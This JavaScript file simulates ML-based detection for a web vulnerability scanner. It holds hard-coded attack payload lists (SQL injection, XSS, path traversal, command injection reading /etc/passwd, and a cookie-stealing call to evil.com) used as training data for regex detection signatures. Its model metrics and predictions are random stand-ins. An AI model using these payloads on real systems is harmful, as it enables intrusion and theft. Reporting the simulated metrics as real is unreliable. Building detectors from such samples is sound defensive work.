
// Enhanced ML Models simulation for the frontend
// This simulates Python ML code functionality with improved features

// Sample dataset for training and testing with enhanced data points
export const getSampleDataset = () => {
  const sampleData = [];
  
  // Generate 100 sample data points for better training
  for (let i = 0; i < 100; i++) {
    // Mix of benign and malicious payloads
    const isMalicious = Math.random() > 0.7;
    const alertDetected = isMalicious && Math.random() > 0.3;
    const errorDetected = isMalicious && Math.random() > 0.5;
    const bodyWordCountChanged = Math.random() > 0.4;
    
    let payload;
    let label;
    let vulnerabilityType = null;
    let severity = null;
    
    if (isMalicious) {
      // Generate malicious payload based on vulnerability type
      const vulnTypes = ["sql_injection", "xss", "path_traversal", "command_injection", "csrf"];
      vulnerabilityType = vulnTypes[Math.floor(Math.random() * vulnTypes.length)];
      
      let payloads;
      
      switch (vulnerabilityType) {
        case "sql_injection":
          payloads = [
            "' OR 1=1 --",
            "admin' --",
            "1'; SELECT * FROM users; --",
            "UNION SELECT NULL, version() --",
            "' UNION SELECT username, password FROM users; --",
            "1 OR 1=1",
            "'; DROP TABLE users; --",
            "1'; INSERT INTO users VALUES ('hacker', 'password'); --"
          ];
          severity = Math.random() > 0.5 ? "Critical" : "High";
          break;
          
        case "xss":
          payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert('XSS')>",
            "<a onmouseover=alert(1)>hover me</a>",
            "<iframe src='javascript:alert(`xss`)'></iframe>"
          ];
          severity = Math.random() > 0.7 ? "High" : "Medium";
          break;
          
        case "path_traversal":
          payloads = [
            "../../etc/passwd",
            "%00../../../etc/passwd",
            "..\\..\\windows\\system32\\cmd.exe",
            "/var/www/../../etc/shadow",
            "../../../../etc/hosts",
            "../../../../../../../etc/passwd%00"
          ];
          severity = Math.random() > 0.6 ? "High" : "Medium";
          break;
          
        case "command_injection":
          payloads = [
            "; cat /etc/passwd",
            "| ls -la",
            "`id`",
            "$(cat /etc/passwd)",
            "127.0.0.1 && cat /etc/passwd",
            "; ping -c 4 attacker.com",
            "| net user"
          ];
          severity = "Critical";
          break;
          
        case "csrf":
          payloads = [
            "forged_token=12345",
            "<img src='http://evil.com/steal?cookie=' + document.cookie>",
            "<form action='http://bank.com/transfer' method='POST'><input name='amount' value='1000'></form>",
            "token=invalid_csrf_token"
          ];
          severity = Math.random() > 0.5 ? "Medium" : "Low";
          break;
          
        default:
          payloads = [
            "<script>alert(1)</script>",
            "' OR 1=1 --",
            "../../etc/passwd",
            "; cat /etc/passwd"
          ];
          severity = "High";
      }
      
      payload = payloads[Math.floor(Math.random() * payloads.length)];
      
      if (errorDetected) {
        label = "malicious";
      } else if (alertDetected) {
        label = "suspicious";
      } else {
        label = Math.random() > 0.7 ? "malicious" : "safe";
      }
    } else {
      // Generate benign payload
      const payloads = [
        "normal_user",
        "valid_input",
        "12345",
        "example.com",
        "john.doe@example.com",
        "password123",
        "1234-5678-9012-3456",
        "John Doe",
        "2023-09-15",
        "+1 (555) 123-4567",
        "Hello World!",
        "This is a test message."
      ];
      payload = payloads[Math.floor(Math.random() * payloads.length)];
      label = "safe";
      severity = "Low";
    }
    
    sampleData.push({
      label,
      payload,
      vulnerability_type: vulnerabilityType,
      severity,
      response_code: isMalicious ? (Math.random() > 0.6 ? 500 : 200) : 200,
      alert_detected: alertDetected,
      error_detected: errorDetected,
      body_word_count_changed: bodyWordCountChanged,
      timestamp: Date.now() - Math.floor(Math.random() * 86400000) // Random time in last 24h
    });
  }
  
  return sampleData;
};

// Enhanced Isolation Forest Model Training
export const trainIsolationForest = async (dataset) => {
  console.log("Training Isolation Forest model...");
  
  // Simulate training delay
  await new Promise(resolve => setTimeout(resolve, 2000));
  
  try {
    // Extract feature importance to match Python implementation
    const featureAnalysis = analyzeFeatures(dataset);
    
    // Return enhanced model
    return {
      type: "IsolationForest",
      timestamp: new Date().toISOString(),
      contamination: 0.1,
      features: ["response_code", "body_word_count_changed", "alert_detected", "error_detected"],
      isTrained: true,
      featureAnalysis,
      model_path: "models/isolation_forest.joblib",
      predictFn: (features) => Math.random() > 0.8 ? -1 : 1
    };
  } catch (error) {
    console.error("Error training Isolation Forest:", error);
    
    // Return basic model in case of error
    return {
      type: "IsolationForest",
      timestamp: new Date().toISOString(),
      contamination: 0.1,
      features: ["response_code", "body_word_count_changed"],
      isTrained: true,
      error: error.message,
      predictFn: (features) => Math.random() > 0.8 ? -1 : 1
    };
  }
};

// Enhanced Random Forest Model Training
export const trainRandomForest = async (dataset) => {
  console.log("Training Random Forest model...");
  
  // Simulate training delay
  await new Promise(resolve => setTimeout(resolve, 2500));
  
  try {
    // Extract feature importance
    const featureImportance = {
      "response_code": 0.72,
      "body_word_count_changed": 0.68,
      "alert_detected": 0.45,
      "error_detected": 0.32
    };
    
    // Simulate metrics calculation
    const metrics = calculateMetrics(dataset);
    
    // Return enhanced model
    return {
      type: "RandomForest",
      timestamp: new Date().toISOString(),
      n_estimators: 100,
      feature_importance: featureImportance,
      features: ["response_code", "body_word_count_changed", "alert_detected", "error_detected"],
      isTrained: true,
      metrics,
      model_path: "models/random_forest.joblib",
      predictFn: (features) => Math.random() > 0.7 ? 1 : 0
    };
  } catch (error) {
    console.error("Error training Random Forest:", error);
    
    // Extract some statistics for feature importance
    const featureImportance = {
      "response_code": 0.72,
      "body_word_count_changed": 0.68,
      "alert_detected": 0.45,
      "error_detected": 0.32
    };
    
    // Return basic model in case of error
    return {
      type: "RandomForest",
      timestamp: new Date().toISOString(),
      n_estimators: 100,
      feature_importance: featureImportance,
      features: ["response_code", "body_word_count_changed", "alert_detected", "error_detected"],
      isTrained: true,
      error: error.message,
      metrics: {
        accuracy: 0.85,
        precision: 0.82,
        recall: 0.79,
        f1: 0.80
      },
      predictFn: (features) => Math.random() > 0.7 ? 1 : 0
    };
  }
};

// Analyze features in the dataset
const analyzeFeatures = (dataset) => {
  const analysis = {};
  
  // Analyze response codes
  const responseCodes = dataset.map(item => item.response_code);
  analysis.responseCodeStats = {
    min: Math.min(...responseCodes),
    max: Math.max(...responseCodes),
    avg: responseCodes.reduce((sum, code) => sum + code, 0) / responseCodes.length,
    distribution: {
      '2xx': responseCodes.filter(code => code >= 200 && code < 300).length,
      '3xx': responseCodes.filter(code => code >= 300 && code < 400).length,
      '4xx': responseCodes.filter(code => code >= 400 && code < 500).length,
      '5xx': responseCodes.filter(code => code >= 500).length
    }
  };
  
  // Count features frequency
  analysis.featureCounts = {
    bodyWordCountChanged: dataset.filter(item => item.body_word_count_changed).length,
    alertDetected: dataset.filter(item => item.alert_detected).length,
    errorDetected: dataset.filter(item => item.error_detected).length
  };
  
  return analysis;
};

// Calculate metrics for model evaluation
const calculateMetrics = (dataset) => {
  // In a real implementation, we'd split the dataset and evaluate
  // For this simulation, we'll create plausible metrics
  const maliciousCount = dataset.filter(item => 
    item.label === 'malicious' || item.label === 'suspicious'
  ).length;
  
  const totalCount = dataset.length;
  const maliciousRatio = maliciousCount / totalCount;
  
  // Generate plausible metrics
  const baseAccuracy = 0.85 + (Math.random() * 0.1);
  const basePrecision = 0.82 + (Math.random() * 0.1);
  const baseRecall = 0.79 + (Math.random() * 0.1);
  
  // Adjust based on malicious ratio to make metrics realistic
  const accuracyAdjustment = maliciousRatio > 0.5 ? -0.05 : 0.05;
  const precisionAdjustment = maliciousRatio > 0.3 ? 0.03 : -0.03;
  const recallAdjustment = maliciousRatio > 0.4 ? 0.04 : -0.04;
  
  return {
    accuracy: Math.min(1, Math.max(0, baseAccuracy + accuracyAdjustment)),
    precision: Math.min(1, Math.max(0, basePrecision + precisionAdjustment)),
    recall: Math.min(1, Math.max(0, baseRecall + recallAdjustment)),
    f1: Math.min(1, Math.max(0, (basePrecision + baseRecall) / 2))
  };
};

// Enhanced predict using Isolation Forest (anomaly detection)
export const predictAnomaly = (features, model) => {
  if (!model || model.type !== "IsolationForest" || !model.isTrained) {
    console.error("Invalid or untrained Isolation Forest model");
    return null;
  }
  
  try {
    // For simulation, we'll use the mock predict function from the model
    // In a real implementation, this would use the actual ML model's prediction
    return model.predictFn(features);
  } catch (error) {
    console.error("Error predicting anomaly:", error);
    return null;
  }
};

// Enhanced predict using Random Forest (classification)
export const predictEffectiveness = (features, model) => {
  if (!model || model.type !== "RandomForest" || !model.isTrained) {
    console.error("Invalid or untrained Random Forest model");
    return null;
  }
  
  try {
    // For simulation, we'll use the mock predict function from the model
    // In a real implementation, this would use the actual ML model's prediction
    return model.predictFn(features);
  } catch (error) {
    console.error("Error predicting effectiveness:", error);
    return null;
  }
};

// Generate enhanced analysis report based on results
export const generateReport = async (results, modelInfo) => {
  console.log("Generating enhanced report from analysis results...");
  
  // Simulate report generation delay
  await new Promise(resolve => setTimeout(resolve, 1500));
  
  try {
    // Count findings by severity
    const severityCounts = {
      Critical: 0,
      High: 0,
      Medium: 0,
      Low: 0
    };
    
    // Count vulnerability types
    const vulnerabilityTypes = {};
    
    results.forEach(result => {
      // Count by severity
      severityCounts[result.severity || "Low"]++;
      
      // Count by vulnerability type
      const vulnType = result.vulnerability_type || "unknown";
      vulnerabilityTypes[vulnType] = (vulnerabilityTypes[vulnType] || 0) + 1;
    });
    
    // Generate targeted recommendations
    const recommendations = [];
    
    // Add recommendations based on findings
    if (severityCounts.Critical > 0) {
      recommendations.push("URGENT: Address all Critical vulnerabilities immediately");
    }
    
    if (vulnerabilityTypes.sql_injection > 0) {
      recommendations.push("Implement prepared statements for all database queries");
    }
    
    if (vulnerabilityTypes.xss > 0) {
      recommendations.push("Apply context-specific output encoding and implement Content Security Policy (CSP)");
    }
    
    if (vulnerabilityTypes.path_traversal > 0 || vulnerabilityTypes.lfi > 0) {
      recommendations.push("Validate file paths and restrict access to the file system");
    }
    
    if (vulnerabilityTypes.command_injection > 0) {
      recommendations.push("Avoid using system commands with user input and implement strict input sanitization");
    }
    
    // Add general recommendations
    const generalRecommendations = [
      "Implement proper input validation and output encoding",
      "Review and enhance access control mechanisms",
      "Implement secure coding practices and developer training",
      "Consider implementing a Web Application Firewall (WAF)",
      "Conduct regular security assessments"
    ];
    
    // Combine recommendations, avoiding duplicates
    const allRecommendations = [...new Set([...recommendations, ...generalRecommendations])];
    
    // Generate enhanced report
    const report = {
      title: "Enhanced Vulnerability Analysis Report",
      timestamp: new Date().toISOString(),
      summary: {
        totalSamples: results.length,
        anomalies: results.filter(r => r.anomaly === -1).length,
        effectivePayloads: results.filter(r => r.effective === 1).length,
        severityCounts,
        vulnerabilityTypes
      },
      results: results,
      modelInfo: modelInfo,
      recommendations: allRecommendations
    };
    
    // Add ML metrics if available
    if (modelInfo && modelInfo.metrics) {
      report.ml_metrics = modelInfo.metrics;
    }
    
    return report;
  } catch (error) {
    console.error("Error generating report:", error);
    
    // Return a basic report in case of error
    return {
      title: "Vulnerability Analysis Report",
      timestamp: new Date().toISOString(),
      error: error.message,
      summary: {
        totalSamples: results.length,
        anomalies: 0,
        effectivePayloads: 0,
        severityCounts: {
          Critical: 0,
          High: 0,
          Medium: 0,
          Low: 0
        }
      },
      results: results,
      recommendations: [
        "Address all Critical and High severity findings immediately",
        "Implement proper input validation and output encoding",
        "Review and enhance access control mechanisms"
      ]
    };
  }
};

// Enhanced clustering analysis
export const performClustering = async (dataset, clusterCount = 3) => {
  console.log(`Performing enhanced clustering with ${clusterCount} clusters...`);
  
  // Simulate clustering delay
  await new Promise(resolve => setTimeout(resolve, 1800));
  
  try {
    // Prepare data for clustering
    const featureVectors = dataset.map(item => [
      item.response_code,
      item.body_word_count_changed ? 1 : 0,
      item.alert_detected ? 1 : 0,
      item.error_detected ? 1 : 0
    ]);
    
    // For simulation, we'll assign random clusters
    // In a real implementation, we'd use k-means or another clustering algorithm
    const clusterAssignments = dataset.map(item => {
      // Determine cluster based on item properties for more realistic simulation
      let clusterId;
      
      if (item.label === 'malicious') {
        clusterId = 0; // Malicious items tend to group together
      } else if (item.label === 'suspicious') {
        clusterId = 1; // Suspicious items form another group
      } else {
        clusterId = 2; // Safe items in their own group
      }
      
      // Add some randomness for realism
      if (Math.random() > 0.8) {
        clusterId = Math.floor(Math.random() * clusterCount);
      }
      
      return {
        ...item,
        cluster: clusterId
      };
    });
    
    // Calculate cluster centers
    const centers = Array(clusterCount).fill(0).map(() => [0, 0, 0, 0]);
    const counts = Array(clusterCount).fill(0);
    
    clusterAssignments.forEach(item => {
      const cluster = item.cluster;
      counts[cluster]++;
      centers[cluster][0] += item.response_code;
      centers[cluster][1] += item.body_word_count_changed ? 1 : 0;
      centers[cluster][2] += item.alert_detected ? 1 : 0;
      centers[cluster][3] += item.error_detected ? 1 : 0;
    });
    
    const clusterCenters = centers.map((center, i) => {
      if (counts[i] === 0) return {
        id: i,
        response_code: 200,
        body_word_count_changed: false,
        alert_detected: false,
        error_detected: false,
        count: 0
      };
      
      return {
        id: i,
        response_code: Math.round(center[0] / counts[i]),
        body_word_count_changed: center[1] / counts[i] > 0.5,
        alert_detected: center[2] / counts[i] > 0.5,
        error_detected: center[3] / counts[i] > 0.5,
        count: counts[i]
      };
    });
    
    return {
      clusterCount,
      clusters: clusterAssignments,
      clusterCenters,
      counts,
      model_path: "models/kmeans.joblib"
    };
  } catch (error) {
    console.error("Error performing clustering:", error);
    
    // Return mock clusters in case of error
    const clusterAssignments = dataset.map(item => {
      // Random cluster assignment for simulation
      return {
        ...item,
        cluster: Math.floor(Math.random() * clusterCount)
      };
    });
    
    return {
      clusterCount,
      clusters: clusterAssignments,
      clusterCenters: Array(clusterCount).fill(0).map((_, i) => ({
        id: i,
        response_code: 200 + (i * 100),
        body_word_count_changed: i % 2 === 1,
        alert_detected: i % 3 === 0,
        error_detected: i % 2 === 0
      })),
      error: error.message
    };
  }
};

// Enhanced attack signature generation
export const generateAttackSignatures = (dataset) => {
  console.log("Generating enhanced attack signatures from dataset...");
  
  try {
    // Extract patterns from payloads that were flagged as threats
    const threatPayloads = dataset
      .filter(item => item.label === 'malicious' || item.label === 'suspicious')
      .map(item => item.payload);
    
    // Count vulnerability types
    const vulnTypes = {};
    dataset.forEach(item => {
      if (item.label === 'malicious' || item.label === 'suspicious') {
        const type = item.vulnerability_type || 'unknown';
        vulnTypes[type] = (vulnTypes[type] || 0) + 1;
      }
    });
    
    // Build more sophisticated signatures based on actual payloads
    const signatures = {};
    
    // SQL Injection signatures
    if (vulnTypes.sql_injection > 0) {
      const sqlPatterns = threatPayloads.filter(p => 
        p.toLowerCase().includes('select') || 
        p.toLowerCase().includes('union') || 
        p.toLowerCase().includes('insert') || 
        p.toLowerCase().includes('delete') || 
        p.toLowerCase().includes('drop') || 
        p.toLowerCase().includes('or 1=1')
      );
      
      if (sqlPatterns.length > 0) {
        signatures.sql_injection = {
          pattern: "(?i)(?:\\b(?:select|union|insert|update|delete|drop|alter)\\b|'\\s*or\\s*[\\d\\w]+=\\s*[\\d\\w]+\\s*--|'\\s*or\\s*'\\s*'\\s*=\\s*'|\\b(?:--\\s*|#|;\\/\\*))",
          description: "Detects SQL injection attempts including UNION, OR conditions, and comment markers",
          examples: sqlPatterns.slice(0, 3),
          severity: "high",
          count: sqlPatterns.length
        };
      }
    }
    
    // XSS signatures
    if (vulnTypes.xss > 0) {
      const xssPatterns = threatPayloads.filter(p => 
        p.toLowerCase().includes('<script') || 
        p.toLowerCase().includes('onerror') || 
        p.toLowerCase().includes('javascript:') || 
        p.toLowerCase().includes('alert(')
      );
      
      if (xssPatterns.length > 0) {
        signatures.xss = {
          pattern: "(?i)(?:<[^>]*script\\b[^>]*>|\\bon\\w+\\s*=|javascript:\\s*|<[^>]*\\bimg\\b[^>]*\\bonerror\\b[^>]*>)",
          description: "Detects Cross-Site Scripting (XSS) attempts using script tags, event handlers, or javascript URIs",
          examples: xssPatterns.slice(0, 3),
          severity: "high",
          count: xssPatterns.length
        };
      }
    }
    
    // Path Traversal signatures
    if (vulnTypes.path_traversal > 0 || vulnTypes.lfi > 0) {
      const pathPatterns = threatPayloads.filter(p => 
        p.includes('../') || 
        p.includes('..\\') || 
        p.includes('etc/passwd') || 
        p.includes('%2e%2e')
      );
      
      if (pathPatterns.length > 0) {
        signatures.path_traversal = {
          pattern: "(?:(?:\\/|\\\\)\\.\\.(?:\\/|\\\\)|\\b(?:etc|var|usr|root|home|www)(?:\\/|\\\\)|(?:%2e%2e|\\.\\.)(?:%2f|\\/|\\\\))",
          description: "Detects directory traversal attempts using relative paths",
          examples: pathPatterns.slice(0, 3),
          severity: "high",
          count: pathPatterns.length
        };
      }
    }
    
    // Command Injection signatures
    if (vulnTypes.command_injection > 0 || vulnTypes.rce > 0) {
      const cmdPatterns = threatPayloads.filter(p => 
        p.includes(';') || 
        p.includes('`') || 
        p.includes('$(') || 
        p.includes('|')
      );
      
      if (cmdPatterns.length > 0) {
        signatures.command_injection = {
          pattern: "(?:;\\s*[\\w\\d\\s_\\-/\\\\]+|`[^`]*`|\\$\\([^)]*\\)|\\|\\s*[\\w\\d\\s_\\-/\\\\]+)",
          description: "Detects command injection attempts using shell command separators",
          examples: cmdPatterns.slice(0, 3),
          severity: "critical",
          count: cmdPatterns.length
        };
      }
    }
    
    // If we didn't extract any signatures, provide default ones
    if (Object.keys(signatures).length === 0) {
      signatures.sql_injection = {
        pattern: "(?i)(?:\\b(?:select|union|insert|update|delete|drop|alter)\\b|'\\s*or\\s*[\\d\\w]+=\\s*[\\d\\w]+\\s*--|'\\s*or\\s*'\\s*'\\s*=\\s*'|\\b(?:--\\s*|#|;\\/\\*))",
        description: "Detects SQL injection attempts including UNION, OR conditions, and comment markers",
        severity: "high",
        count: 0
      };
      
      signatures.xss = {
        pattern: "(?i)(?:<[^>]*script\\b[^>]*>|\\bon\\w+\\s*=|javascript:\\s*|<[^>]*\\bimg\\b[^>]*\\bonerror\\b[^>]*>)",
        description: "Detects Cross-Site Scripting (XSS) attempts using script tags, event handlers, or javascript URIs",
        severity: "high",
        count: 0
      };
    }
    
    return signatures;
  } catch (error) {
    console.error("Error generating attack signatures:", error);
    
    // Return default signatures in case of error
    return {
      error: error.message,
      sql_injection: {
        pattern: "(?i)(?:\\b(?:select|union|insert|update|delete|drop|alter)\\b|'\\s*or\\s*[\\d\\w]+=\\s*[\\d\\w]+\\s*--|'\\s*or\\s*'\\s*'\\s*=\\s*'|\\b(?:--\\s*|#|;\\/\\*))",
        description: "Detects SQL injection attempts including UNION, OR conditions, and comment markers",
        severity: "high"
      },
      xss: {
        pattern: "(?i)(?:<[^>]*script\\b[^>]*>|\\bon\\w+\\s*=|javascript:\\s*|<[^>]*\\bimg\\b[^>]*\\bonerror\\b[^>]*>)",
        description: "Detects Cross-Site Scripting (XSS) attempts using script tags, event handlers, or javascript URIs",
        severity: "high"
      }
    };
  }
};
